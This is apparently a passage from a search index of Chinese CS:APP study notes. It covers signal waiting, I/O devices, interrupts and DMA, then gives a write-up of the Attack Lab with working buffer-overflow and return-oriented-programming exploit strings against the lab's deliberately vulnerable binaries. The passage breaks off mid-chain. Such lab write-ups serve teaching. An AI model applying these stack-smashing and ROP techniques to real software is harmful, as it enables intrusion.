\u4f8b\u5b50\u7684\u4f7f\u7528\u65b9\u6cd5\u4e3a: \u5148\u963b\u585e SIGCHLD \uff0c\u518d\u7528 sigsuspend \u53d6\u6d88\u5bf9 SIGCHLD \u7684\u963b\u585e\uff0c\u4fdd\u8bc1\u4e86\u4e0d\u4f1a\u5728 pause \u548c\u5faa\u73af\u6761\u4ef6\u4e4b\u95f4\u6267\u884c SIGCHLD \u7684 handler","title":"(4). \u663e\u5f0f\u7b49\u5f85\u4fe1\u53f7"},{"location":"_csapp/_ECF/3/","text":"","title":"3. nonlocal jump"},{"location":"_csapp/_ECF/ini/","text":"","title":"?"},{"location":"_csapp/_IO/basis/","text":"1. I/O \u8bbe\u5907 \ud83e\uddd0 (1). I/O \u8bbe\u5907\u5206\u7c7b \ud83e\uddd0 \u5757\u8bbe\u5907: \u4ee5\u5757\u4e3a\u5355\u4f4d\u5bfb\u5740\u3001\u4f20\u9001\uff0c\u5bf9\u5e94\u7cfb\u7edf\u8c03\u7528 write() \uff0c read() , seek() \u7b49 \u5b57\u7b26\u8bbe\u5907: \u4ee5\u5b57\u7b26\u4e3a\u5355\u4f4d\uff0c\u5bf9\u5e94\u7cfb\u7edf\u8c03\u7528 get() , put() \u7b49 \u7f51\u7edc\u8bbe\u5907: \u7f51\u7edc I/O \u7684\u6027\u80fd\u548c\u5bfb\u5740\u7279\u70b9\u4e0d\u540c\u4e8e\u78c1\u76d8 I/O\uff0c\u5bf9\u5e94 socket \u7cfb\u5217\u7684\u7cfb\u7edf\u8c03\u7528 \u5176\u4ed6\uff0c\u5982\u65f6\u949f (2). I/O \u5c42\u6b21 \ud83e\uddd0 \u8bbe\u5907\u786c\u4ef6: \u5305\u542b\u63a7\u5236\u5668\u548c\u7f13\u51b2\u533a\uff0c\u63a7\u5236\u5668\u7531\u82e5\u5e72\u5bc4\u5b58\u5668\u7ec4\u6210\uff0c\u8bbe\u5907\u901a\u8fc7\u63a7\u5236\u5668\u548c\u4e2d\u65ad\u673a\u5236\u4e0e cpu \u901a\u4fe1 OS \u8bbe\u7f6e\u5bc4\u5b58\u5668\u547d\u4ee4\u8bbe\u5907\u53d1\u9001\u63a5\u53d7\u6570\u636e\u3001\u5f00\u6216\u5173 \u6309\u4e0b\u952e\u76d8\u4ea7\u751f\u4e2d\u65ad\uff0c\u8df3\u5230\u952e\u76d8\u9a71\u52a8\u6ce8\u518c\u7684 handler \u78c1\u76d8\u9700\u8981\u7f13\u51b2\u533a \u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f: \u6309 OS \u7ed9\u5b9a\u7684\u63a5\u53e3\u63d0\u4f9b\u5b9e\u73b0 \u4f8b\u5982 linux \u7684 file_operation \u8bbe\u5907\u521d\u59cb\u5316\u65f6\uff0c\u8981\u6ce8\u518c\u8bbe\u5907\u7684\u4e2d\u65ad handler (\u4f8b\u5982 require_irq() ) \u8bbe\u5907\u65e0\u5173\u5c42: \u63d0\u4f9b\u7f13\u51b2\u3001\u8c03\u5ea6\u3001\u4fdd\u62a4\u3001\u547d\u540d\u7b49\u529f\u80fd \u7528\u6237\u8fdb\u7a0b\u53d1\u8d77 IO \u8bf7\u6c42 \u4e3a\u4ec0\u4e48\u78c1\u76d8\u9700\u8981\u7f13\u51b2\u533a \u53ef\u4ee5\u5148\u7f13\u51b2\u4e00\u4e2a\u6216\u591a\u4e2a\u5757\uff0c\u7136\u540e\u68c0\u67e5\u6821\u9a8c\u548c\uff0c\u518d\u4f20\u9001\u5230\u5185\u5b58 \u5982\u679c\u76f4\u63a5\u4f20\u9001\uff0c\u5219\u6bcf\u4e2a\u5b57\u8282\u90fd\u9700\u8981\u8bf7\u6c42\u603b\u7ebf\uff0c\u53ef\u80fd\u9020\u6210\u7b49\u5f85\uff0c\u90a3\u4e48\u4e0b\u4e00\u4e2a\u5b57\u8282\u6765\u4e86\u5c31\u9700\u8981\u7f13\u51b2 linux fs.h \u2002 file_operation struct file_operations { struct module * owner ; loff_t ( * llseek ) ( struct file * , loff_t , int ); ssize_t ( * read ) ( struct file * , char __user * , size_t , loff_t * ); ssize_t ( * write ) ( struct file * , const char __user * , size_t , loff_t * ); unsigned int ( * poll ) ( struct file * , struct poll_table_struct * ); long ( * compat_ioctl ) ( struct file * , unsigned int , unsigned long ); int ( * mmap ) ( struct file * , struct vm_area_struct * ); int ( * open ) ( struct inode * , struct file * ); int ( * flush ) ( struct file * , fl_owner_t id ); int ( * release ) ( struct inode * , struct file * ); int ( * lock ) ( struct file * , int , struct file_lock * ); ... }; 2. I/O \u65b9\u5f0f \ud83e\uddd0 (1). \u8f6e\u8be2 \ud83e\uddd0 \u5185\u6838\u7a0b\u5e8f (cpu) \u4e0d\u65ad\u8f6e\u8be2 (polling) \u8bbe\u5907\u7684\u72b6\u6001\u5bc4\u5b58\u5668\uff0c\u76f4\u5230\u5176\u5c31\u7eea\uff0c\u6267\u884c I/O \u8fc7\u7a0b \u5982\u679c I/O \u9700\u8981\u65f6\u95f4\u5f88\u77ed\uff0c\u6216 cpu \u6ca1\u6709\u5176\u4ed6\u4e8b\u8981\u505a (\u5982\u5d4c\u5165\u5f0f\u7cfb\u7edf)\uff0c\u8f6e\u8be2\u5f88\u5408\u7406 \u5426\u5219\uff0cI/O \u8017\u65f6\u5f88\u957f\uff0ccpu \u9700\u8981\u7b49\u5f85\u5e76\u4e0d\u65ad\u8f6e\u8be2\u8017\u8d39\u6307\u4ee4\u5468\u671f\uff0c\u5f71\u54cd\u5b8c\u6210\u5176\u4ed6\u4efb\u52a1 (2). \u4e2d\u65ad \ud83e\uddd0 \u9047\u5230 I/O \u6307\u4ee4\u540e\uff0c\u6302\u8d77\u5f53\u524d\u8fdb\u7a0b\uff0c\u5f85\u8bbe\u5907\u53ef\u7528\u540e\u53d1\u51fa\u4e2d\u65ad\uff0c\u8c03\u7528 handler \u6267\u884c I/O\u3002\u4ee5\u7f51\u5361\u4e3a\u4f8b: \u7a0b\u5e8f\u9047\u5230 I/O \u7cfb\u7edf\u8c03\u7528\uff0c\u505a\u5b8c I/O \u7684\u51c6\u5907\u5de5\u4f5c\u540e (\u51c6\u5907\u7f13\u51b2\u533a\u3001\u8bbe\u7f6e\u53c2\u6570\u7b49)\uff0c\u6302\u8d77\u5f53\u524d\u8fdb\u7a0b \u7f51\u5361\u63a5\u6536\u5230\u6570\u636e\u5305\uff0c\u901a\u8fc7\u4e2d\u65ad\u901a\u77e5\u5185\u6838 \u5185\u6838\u6267\u884c\u7f51\u5361\u9a71\u52a8\u6ce8\u518c\u7684 handler\uff0c\u62f7\u8d1d\u6570\u636e\u5305\u5230\u5185\u6838\u7f13\u51b2\u533a \u6b64\u65f6 I/O \u5df2\u5b8c\u6210\uff0c\u53ef\u4ee5\u8c03\u5ea6\u539f\u8fdb\u7a0b\u6267\u884c \u4e2d\u65ad I/O \u7684\u7f3a\u70b9\u5728\u4e8e\u6bcf\u4e2a\u5b57\u7b26\u90fd\u652f\u4ed8\u4e00\u6b21\u4e2d\u65ad\u7684\u4ee3\u4ef7 (3). DMA \ud83e\uddd0 \u5b57\u8282\u5f88\u591a\u65f6\u9700\u8981\u5927\u91cf\u4e2d\u65ad\uff0cDMA \u5728\u5176\u57fa\u7840\u4e0a\u53ea\u8981\u4e00\u6b21: cpu \u5bf9 DMA \u63a7\u5236\u5668\u53d1\u9001 I/O \u8bf7\u6c42\uff0c\u968f\u540e\u6302\u8d77\u8c03\u5ea6\u5176\u4ed6\u7a0b\u5e8f DMA \u6267\u884c\u6307\u4ee4\uff0c\u901a\u77e5\u78c1\u76d8\u8bfb\u6570\u636e\u5230\u78c1\u76d8\u7f13\u51b2\u533a\u518d\u5230\u5185\u6838\u7f13\u51b2\u533a\uff0c\u78c1\u76d8\u4f20\u8f93\u5b8c\u6210\u540e\u901a\u77e5 DMA \u63a7\u5236\u5668 DMA \u5411 cpu \u53d1\u9001\u4e00\u4e2a\u4e2d\u65ad\uff0c\u8868\u660e I/O \u5df2\u5b8c\u6210 DMA \u7684\u7f3a\u70b9: DMA \u4f20\u9001\u5360\u7528\u5185\u5b58\u603b\u7ebf\u65f6\uff0ccpu \u65e0\u6cd5\u8bbf\u95ee\u5185\u5b58 (\u4f46\u53ef\u4ee5\u8bbf\u95ee\u9ad8\u901f\u7f13\u5b58) DMA \u6267\u884c\u6307\u4ee4\u6162\u4e8e cpu \u56e0\u6b64\u4f7f\u7528 DMA \u9002\u7528\u4e8e\u5927\u91cf\u7684\u4f20\u8f93 (\u4e2d\u65ad I/O \u6027\u80fd\u5f88\u5dee\u65f6)","title":"1. basis"},{"location":"_csapp/_IO/basis/#1-io","text":"","title":"1. I/O \u8bbe\u5907"},{"location":"_csapp/_IO/basis/#1-io_1","text":"\u5757\u8bbe\u5907: \u4ee5\u5757\u4e3a\u5355\u4f4d\u5bfb\u5740\u3001\u4f20\u9001\uff0c\u5bf9\u5e94\u7cfb\u7edf\u8c03\u7528 write() \uff0c read() , seek() \u7b49 \u5b57\u7b26\u8bbe\u5907: \u4ee5\u5b57\u7b26\u4e3a\u5355\u4f4d\uff0c\u5bf9\u5e94\u7cfb\u7edf\u8c03\u7528 get() , put() \u7b49 \u7f51\u7edc\u8bbe\u5907: \u7f51\u7edc I/O \u7684\u6027\u80fd\u548c\u5bfb\u5740\u7279\u70b9\u4e0d\u540c\u4e8e\u78c1\u76d8 I/O\uff0c\u5bf9\u5e94 socket \u7cfb\u5217\u7684\u7cfb\u7edf\u8c03\u7528 \u5176\u4ed6\uff0c\u5982\u65f6\u949f","title":"(1). I/O \u8bbe\u5907\u5206\u7c7b"},{"location":"_csapp/_IO/basis/#2-io","text":"\u8bbe\u5907\u786c\u4ef6: \u5305\u542b\u63a7\u5236\u5668\u548c\u7f13\u51b2\u533a\uff0c\u63a7\u5236\u5668\u7531\u82e5\u5e72\u5bc4\u5b58\u5668\u7ec4\u6210\uff0c\u8bbe\u5907\u901a\u8fc7\u63a7\u5236\u5668\u548c\u4e2d\u65ad\u673a\u5236\u4e0e cpu \u901a\u4fe1 OS \u8bbe\u7f6e\u5bc4\u5b58\u5668\u547d\u4ee4\u8bbe\u5907\u53d1\u9001\u63a5\u53d7\u6570\u636e\u3001\u5f00\u6216\u5173 \u6309\u4e0b\u952e\u76d8\u4ea7\u751f\u4e2d\u65ad\uff0c\u8df3\u5230\u952e\u76d8\u9a71\u52a8\u6ce8\u518c\u7684 handler \u78c1\u76d8\u9700\u8981\u7f13\u51b2\u533a \u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f: \u6309 OS \u7ed9\u5b9a\u7684\u63a5\u53e3\u63d0\u4f9b\u5b9e\u73b0 \u4f8b\u5982 linux \u7684 file_operation \u8bbe\u5907\u521d\u59cb\u5316\u65f6\uff0c\u8981\u6ce8\u518c\u8bbe\u5907\u7684\u4e2d\u65ad handler (\u4f8b\u5982 require_irq() ) \u8bbe\u5907\u65e0\u5173\u5c42: \u63d0\u4f9b\u7f13\u51b2\u3001\u8c03\u5ea6\u3001\u4fdd\u62a4\u3001\u547d\u540d\u7b49\u529f\u80fd \u7528\u6237\u8fdb\u7a0b\u53d1\u8d77 IO \u8bf7\u6c42 \u4e3a\u4ec0\u4e48\u78c1\u76d8\u9700\u8981\u7f13\u51b2\u533a \u53ef\u4ee5\u5148\u7f13\u51b2\u4e00\u4e2a\u6216\u591a\u4e2a\u5757\uff0c\u7136\u540e\u68c0\u67e5\u6821\u9a8c\u548c\uff0c\u518d\u4f20\u9001\u5230\u5185\u5b58 \u5982\u679c\u76f4\u63a5\u4f20\u9001\uff0c\u5219\u6bcf\u4e2a\u5b57\u8282\u90fd\u9700\u8981\u8bf7\u6c42\u603b\u7ebf\uff0c\u53ef\u80fd\u9020\u6210\u7b49\u5f85\uff0c\u90a3\u4e48\u4e0b\u4e00\u4e2a\u5b57\u8282\u6765\u4e86\u5c31\u9700\u8981\u7f13\u51b2 linux fs.h \u2002 file_operation struct file_operations { struct module * owner ; loff_t ( * llseek ) ( struct file * , loff_t , int ); ssize_t ( * read ) ( struct file * , char __user * , size_t , loff_t * ); ssize_t ( * write ) ( struct file * , const char __user * , size_t , loff_t * ); unsigned int ( * poll ) ( struct file * , struct poll_table_struct * ); long ( * compat_ioctl ) ( struct file * , unsigned int , unsigned long ); int ( * mmap ) ( struct file * , struct vm_area_struct * ); int ( * open ) ( struct inode * , struct file * ); int ( * flush ) ( struct file * , fl_owner_t id ); int ( * release ) ( struct inode * , struct file * ); int ( * lock ) ( struct file * , int , struct file_lock * ); ... };","title":"(2). I/O \u5c42\u6b21"},{"location":"_csapp/_IO/basis/#2-io_1","text":"","title":"2. I/O \u65b9\u5f0f"},{"location":"_csapp/_IO/basis/#1","text":"\u5185\u6838\u7a0b\u5e8f (cpu) \u4e0d\u65ad\u8f6e\u8be2 (polling) \u8bbe\u5907\u7684\u72b6\u6001\u5bc4\u5b58\u5668\uff0c\u76f4\u5230\u5176\u5c31\u7eea\uff0c\u6267\u884c I/O \u8fc7\u7a0b \u5982\u679c I/O \u9700\u8981\u65f6\u95f4\u5f88\u77ed\uff0c\u6216 cpu \u6ca1\u6709\u5176\u4ed6\u4e8b\u8981\u505a (\u5982\u5d4c\u5165\u5f0f\u7cfb\u7edf)\uff0c\u8f6e\u8be2\u5f88\u5408\u7406 \u5426\u5219\uff0cI/O \u8017\u65f6\u5f88\u957f\uff0ccpu \u9700\u8981\u7b49\u5f85\u5e76\u4e0d\u65ad\u8f6e\u8be2\u8017\u8d39\u6307\u4ee4\u5468\u671f\uff0c\u5f71\u54cd\u5b8c\u6210\u5176\u4ed6\u4efb\u52a1","title":"(1). \u8f6e\u8be2"},{"location":"_csapp/_IO/basis/#2","text":"\u9047\u5230 I/O \u6307\u4ee4\u540e\uff0c\u6302\u8d77\u5f53\u524d\u8fdb\u7a0b\uff0c\u5f85\u8bbe\u5907\u53ef\u7528\u540e\u53d1\u51fa\u4e2d\u65ad\uff0c\u8c03\u7528 handler \u6267\u884c I/O\u3002\u4ee5\u7f51\u5361\u4e3a\u4f8b: \u7a0b\u5e8f\u9047\u5230 I/O \u7cfb\u7edf\u8c03\u7528\uff0c\u505a\u5b8c I/O \u7684\u51c6\u5907\u5de5\u4f5c\u540e (\u51c6\u5907\u7f13\u51b2\u533a\u3001\u8bbe\u7f6e\u53c2\u6570\u7b49)\uff0c\u6302\u8d77\u5f53\u524d\u8fdb\u7a0b \u7f51\u5361\u63a5\u6536\u5230\u6570\u636e\u5305\uff0c\u901a\u8fc7\u4e2d\u65ad\u901a\u77e5\u5185\u6838 \u5185\u6838\u6267\u884c\u7f51\u5361\u9a71\u52a8\u6ce8\u518c\u7684 handler\uff0c\u62f7\u8d1d\u6570\u636e\u5305\u5230\u5185\u6838\u7f13\u51b2\u533a \u6b64\u65f6 I/O \u5df2\u5b8c\u6210\uff0c\u53ef\u4ee5\u8c03\u5ea6\u539f\u8fdb\u7a0b\u6267\u884c \u4e2d\u65ad I/O \u7684\u7f3a\u70b9\u5728\u4e8e\u6bcf\u4e2a\u5b57\u7b26\u90fd\u652f\u4ed8\u4e00\u6b21\u4e2d\u65ad\u7684\u4ee3\u4ef7","title":"(2). \u4e2d\u65ad"},{"location":"_csapp/_IO/basis/#3-dma","text":"\u5b57\u8282\u5f88\u591a\u65f6\u9700\u8981\u5927\u91cf\u4e2d\u65ad\uff0cDMA \u5728\u5176\u57fa\u7840\u4e0a\u53ea\u8981\u4e00\u6b21: cpu \u5bf9 DMA \u63a7\u5236\u5668\u53d1\u9001 I/O \u8bf7\u6c42\uff0c\u968f\u540e\u6302\u8d77\u8c03\u5ea6\u5176\u4ed6\u7a0b\u5e8f DMA \u6267\u884c\u6307\u4ee4\uff0c\u901a\u77e5\u78c1\u76d8\u8bfb\u6570\u636e\u5230\u78c1\u76d8\u7f13\u51b2\u533a\u518d\u5230\u5185\u6838\u7f13\u51b2\u533a\uff0c\u78c1\u76d8\u4f20\u8f93\u5b8c\u6210\u540e\u901a\u77e5 DMA \u63a7\u5236\u5668 DMA \u5411 cpu \u53d1\u9001\u4e00\u4e2a\u4e2d\u65ad\uff0c\u8868\u660e I/O \u5df2\u5b8c\u6210 DMA \u7684\u7f3a\u70b9: DMA \u4f20\u9001\u5360\u7528\u5185\u5b58\u603b\u7ebf\u65f6\uff0ccpu \u65e0\u6cd5\u8bbf\u95ee\u5185\u5b58 (\u4f46\u53ef\u4ee5\u8bbf\u95ee\u9ad8\u901f\u7f13\u5b58) DMA \u6267\u884c\u6307\u4ee4\u6162\u4e8e cpu \u56e0\u6b64\u4f7f\u7528 DMA \u9002\u7528\u4e8e\u5927\u91cf\u7684\u4f20\u8f93 (\u4e2d\u65ad I/O \u6027\u80fd\u5f88\u5dee\u65f6)","title":"(3). DMA"},{"location":"_csapp/_Labs/attacklab/","text":"\u51c6\u5907 \ud83e\uddd0 Files \ud83e\uddd0 ctarget: \u2002 An executable program vulnerable to code-injection attacks rtarget: \u2002 An executable program vulnerable to return-oriented-programming attacks cookie.txt: \u2002 An 8-digit hex code that you will use as a unique identifier in your attacks. farm.c: \u2002 The source code of your target's \"gadget farm\", which you will use in generating return-oriented programming attacks. hex2raw: \u2002 A utility to generate attack strings Target Program \ud83e\uddd0 C source code unsigned getbuf () { char buf [ BUFFER_SIZE ]; Gets ( buf ); return 1 ; } assembly 00000000004017a8 < getbuf >: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 <Gets> 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 4017be: 90 nop 4017bf: 90 nop ctarget \u548c rtarget \u90fd\u901a\u8fc7 getbuf \u4ece\u6807\u51c6\u8f93\u5165\u4e2d\u8bfb\u5165\u5b57\u7b26\u4e32 (terminated by \\n ) \u5e76\u5b58\u50a8 (along with a null terminator)\uff0c\u9700\u8981\u6ce8\u610f: exploit string \u7684\u4efb\u4f55\u4f4d\u7f6e\u90fd\u4e0d\u80fd\u5305\u542b 0x0a (ascii for \\n ) \u901a\u8fc7\u53cd\u6c47\u7f16\u67e5\u770b BUFFER_SIZE Using hex2raw \ud83e\uddd0 \u5c06\u9700\u8981\u7684\u5341\u516d\u8fdb\u5236\u7801\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u4f5c\u4e3a target \u7684\u8f93\u5165\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f: 1.\u2002set a series of pipes cat exploit.txt | ./hex2raw | ./ctarget -q 2.\u2002store the raw string in a file and use I/O redirection ./hex2raw < exploit.txt > exploit-raw.txt ./ctarget < exploit-raw.txt Generating Byte Codes \ud83e\uddd0 gcc -c example.s objdump -d example.o > example.d \u77e5\u8bc6\u56de\u987e \ud83e\uddd0 \u51fd\u6570\u8c03\u7528\u8fc7\u7a0b: \u2002 \u4fdd\u5b58\u72b6\u6001 \u2192 \u4f20\u53c2 \u2192 call \u2192 \u5f00\u6808 \u2192 ... \u2192 \u91ca\u653e \u2192 ret Part I: Code Injection Attacks \ud83e\uddd0 \u7528 exploit string \u653b\u51fb ctarget \u7a0b\u5e8f\uff0c getbuf \u88ab test \u51fd\u6570\u8c03\u7528 void test () { int val ; val = getbuf (); printf ( \"No exploit. Getbuf returned 0x%x \\n \" , val ); } \u901a\u8fc7 getbuf \u6539\u53d8 buffer\uff0c\u4f7f\u5176\u65e0\u6cd5\u5b89\u5168\u8fd4\u56de test phase1 \ud83e\uddd0 phase1 \u4e0d\u8981\u6c42\u6ce8\u5165\u65b0\u4ee3\u7801\uff0c\u53ea\u9700\u8ba9 getbuf \u8fd4\u56de\u5230 touch1 \uff0cC rep: touch1 void touch1 () { vlevel = 1 ; /* Part of validation protocol */ printf ( \"Touch1!: You called touch1() \\n \" ); validate ( 1 ); exit ( 0 ); } phase1.txt /* padding 40 bytes */ ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee /* return: first address of touch1() */ c0 17 40 00 00 00 00 \u53ea\u9700\u8981\u586b\u5145 0x28 \u4e2a\u5b57\u8282\u540e\uff0c\u7528 touch1 \u7684\u5730\u5740 0x4017c0 \u8986\u76d6 test \u7684\u6808\u5e27\uff0c\u6ce8\u610f\u5c0f\u7aef\u6cd5 phase2 \ud83e\uddd0 phase2 \u9700\u8981\u8fd4\u56de\u5230 touch2 \uff0c\u8fd4\u56de\u4e4b\u524d\u8fd8\u8981\u8c03\u7528\u6ce8\u5165\u7684\u4ee3\u7801\u7528\u4e8e\u4f20\u53c2\uff0c\u4f7f val == cookie touch2 void touch2 ( unsigned val ) { vlevel = 2 ; if ( val == cookie ) { printf ( \"Touch2!: You called touch2(0x%.8x) \\n \" , val ); validate ( 2 ); } elee { printf ( \"Misfire: You called touch2(0x%.8x) \\n \" , val ); fail ( 2 ); } exit ( 0 ); } phase2.s pushq $0x4017ec # first address of touch2 mov $0x59b997fa , %rdi # cookie ret phase2.d 0000000000000000 < .text >: 0: 68 ec 17 40 00 pushq $0x4017ec 5: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi c: c3 retq phase2.txt /* padding 40 bytes */ ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee /* return: injectied codes at 0x5561dca0 + 8 */ a8 dc 61 55 00 00 00 00 /* encoding of injected codes */ 68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3 \u901a\u8fc7 gdb \u67e5\u770b getbuf \u6808\u5e27\u5c3e\u7aef\u7684\u5730\u5740\u4e3a 0x5561dca0 \uff0c\u7136\u540e\u7834\u574f test \u7684\u6808\u5e27\uff0c\u4fee\u6539\u8fd4\u56de\u503c\uff0c\u628a\u6ce8\u5165\u7684\u4ee3\u7801\u5b58\u653e\u5728 0x5561dca8 \u3002(\u4e0d\u8981\u4f7f\u7528 call \u6216 jmp \u8fdb\u884c\u8df3\u8f6c) phase3 \ud83e\uddd0 Level3 \u4e0e Level2 \u76f8\u4f3c\uff0c\u4f46\u9700\u8981\u4f20\u4e00\u4e2a\u5b57\u7b26\u4e32\u6307\u9488\uff0c\u4f7f cookie \u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u4e0e\u4f20\u5165\u7684\u5b57\u7b26\u4e32\u76f8\u7b49 touch3 void touch3 ( char * sval ) { vlevel = 3 ; /* Part of validation protocol */ if ( hexmatch ( cookie , sval )) { printf ( \"Touch3!: You called touch3( \\\" %s \\\" ) \\n \" , sval ); validate ( 3 ); } else { printf ( \"Misfire: You called touch3( \\\" %s \\\" ) \\n \" , sval ); fail ( 3 ); } exit ( 0 ); } hexmatch /* Compare string to hex represention of unsigned value */ int hexmatch ( unsigned val , char * sval ) { char cbuf [ 110 ]; /* Make position of check string unpredictable */ char * s = cbuf + random () % 100 ; sprintf ( s , \"%.8x\" , val ); return strncmp ( sval , s , 9 ) == 0 ; } phase3.s pushq $0x4018fa # first address of touch3 mov $0x5561dca8 , %rdi # address of string constructed manually ret phase3.d 0000000000000000 < .text >: 0: 68 fa 18 40 00 pushq $0x4018fa 5: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi c: c3 phase3.txt /* padding: 40 bytes */ ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee /* return: injected codes at 0x5561dca0 + 8 + 9 */ b1 dc 61 55 00 00 00 00 /* string format of cookie */ 35 39 62 39 39 37 66 61 00 /* encoding of injected codes */ 68 fa 18 40 00 48 c7 c7 a8 dc 61 55 c3 \u56e0\u6b64\u5728\u6808\u5e27\u5c3e\u90e8\u987a\u653e cookie \u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u518d\u653e\u7f6e\u6ce8\u5165\u7684\u4ee3\u7801\u3002\u5c3d\u7ba1 touch3 \u8c03\u7528\u5176\u4ed6\u51fd\u6570\uff0c\u4f46\u6ce8\u5165\u5185\u5bb9\u90fd\u653e\u5728\u4e86 test \u7684\u6808\u5e27\u5185\uff0c\u4e0d\u5fc5\u62c5\u5fc3\u88ab\u7834\u574f\u3002 Part II: Return-Oriented Programming \ud83e\uddd0 rtarget uses two techniques to thwart such attacks: Uses randomization, so the stack positions differ from one run to another. Marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault. The strategy with ROP is to identify byte sequences within an existing program that consist of one or more instructions followed by the instruction ret . Gadgets may not be enough to implement many important operations. Fortunately, with a byte-oriented instruction set, such as x86-64, a gadget can often be found by extracting patterns from other parts of the instruction byte sequence. For example: setval_210.c void setval_210 ( unsigned * p ) { * p = 3347663060U ; } setval_210.d 000000000400f15 < setval_210 >: 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4, (%rdi) 400f1b: c3 retq The byte sequence 48 89 c7 encodes the instruction movq %rax, %rdi . Thus, this code contains a gadget, having a starting address of 0x400f18 . byte encoding of instructions phase4 \ud83e\uddd0 \u4f7f\u7528 gadget farm \u4e2d\u7684 gadget (\u6700\u591a\u4e24\u4e2a)\uff0c\u5bf9 rtarget \u505a\u548c phase2 \u4e00\u6837\u7684\u4e8b: \u9996\u5148\u4fee\u6539\u8fd4\u56de\u5730\u5740\uff0c\u4f7f\u4e4b\u8df3\u8f6c\u5230\u7b2c\u4e00\u4e2a gadget gadget \u9700\u8981\u628a cookie pop \u5230\u4e00\u4e2a\u5bc4\u5b58\u5668 r \uff0c\u7136\u540e mov r, %rdi \uff0c\u6700\u540e\u8fd4\u56de\u5230 touch2 \u56e0\u6b64\uff0c\u9996\u5148\u641c\u7d22 pop r \u7684\u7f16\u7801\uff0c\u7136\u540e\u518d\u641c\u7d22\u5bf9\u5e94\u7684 mov r, %rdi \u7f16\u7801 used gadgets 00000000004019a7 < addval_219 >: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq ... ... 00000000004019c3 < setval_426 >: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 phase4.txt /* padding: 40 bytes */ ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee /* gadget1: pop %rax; retq (58 c3) */ ab 19 40 00 00 00 00 00 /* cookie */ fa 97 b9 59 00 00 00 00 /* gadget2: movq %rax, %rdi; retq (48 89 c7 c3) */ c5 19 40 00 00 00 00 00 /* first address of touch2 */ ec 17 40 00 00 00 00 00 phase5 \ud83e\uddd0 \u505a\u548c phase3 \u7684\u4e00\u6837\u7684\u4e8b\uff0c\u5373\u4f20\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff1b\u96be\u70b9\u5728\u4e8e\uff0c\u7531\u4e8e\u6808\u968f\u673a\u5316\uff0c\u9700\u8981\u4f7f\u7528 %rsp \u7684\u503c\u3002\u9996\u5148\u5728 gadgets \u4e2d\u67e5\u627e\u53ef\u7528\u7684 mov pattern: byte encoding instruction address 48 89 c7 90 c3 movq %rax, %rdi 0x4019c3 48 89 e0 c3 movq %rsp, %rax 0x401a03 89 c2 90 c3 movl %eax, %edx 0x4019db 89 ce 90 90 c3 movl %ecx, %esi 0x401a11 89 d1 38 c9 movl %edx, %ecx 0x401a33 gadgets \u4e2d\u8fd8\u63d0\u4f9b\u4e86\u4e00\u4e2a add_xy \u51fd\u6570\uff0c\u7ed3\u5408\u5b58\u5728\u7684 mov pattern\uff0c\u53ef\u4ee5\u5148\u7531 add_xy \u8ba1\u7b97\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u518d\u4f20\u5165 touch3 phase5 answers used gadgets 00000000004019a7 < addval_219 >: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq ... ... 00000000004019db < getval_481 >: 4019db: b8 5c 89 c2 90 mov $0x90c2895c,%eax 4019e0: c3 ... ... 00000000004019c3 < setval_426 >: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq ... ... 0000000000401a03 < addval_190 >: 401a03: 8d 87 41 48 89 e0 lea -0x1f76b7bf(%rdi),%eax 401a09: c3 retq ... ... 0000000000401a11 < addval_436 >: 401a11: 8d 87 89 ce 90 90 lea -0x6f6f3177(%rdi),%eax 401a17: c3 retq ... ... 0000000000401a33 < getval_159 >: 401a33: b8 89 d1 38 c9 mov $0xc938d189,%eax 401a38: c3 retq ... ... 00000000004019d6 < add_xy >: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq phase5.txt /* padding: 40 bytes */ ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee /* gadget1: movq %rsp, %rax; retq (48 89 e0 c3) */ 06 1a 40 00 00 00 00 00 /* gadget2: movq %rax, %rdi; retq (48 89 c7 90 c3) */ c5 19 40 00 00 00 00 00 /* gadget3: popq %rax; retq (58 90 c3) */ ab 19 40 00 00 00 00 00 /* bias: 72 */ 48 00 00 00 00 00 00 00 /* gadget4: movl %eax, %edx; retq (89 c2 90 c3) */ dd 19 40 00 00 00 00 00 /* gadget5: movl %edx, %ecx; retq (89 d1 38 c9 c3) */ 34 1a 40 00 00 00 00 00 /* gadget6: movl %ecx, %esi; retq (89 ce 90 90 c3) */ 13 1a 40 00 00 00 00 00 /* gadget7: add_xy: %rax = %rdi + %rsi */ d6 19 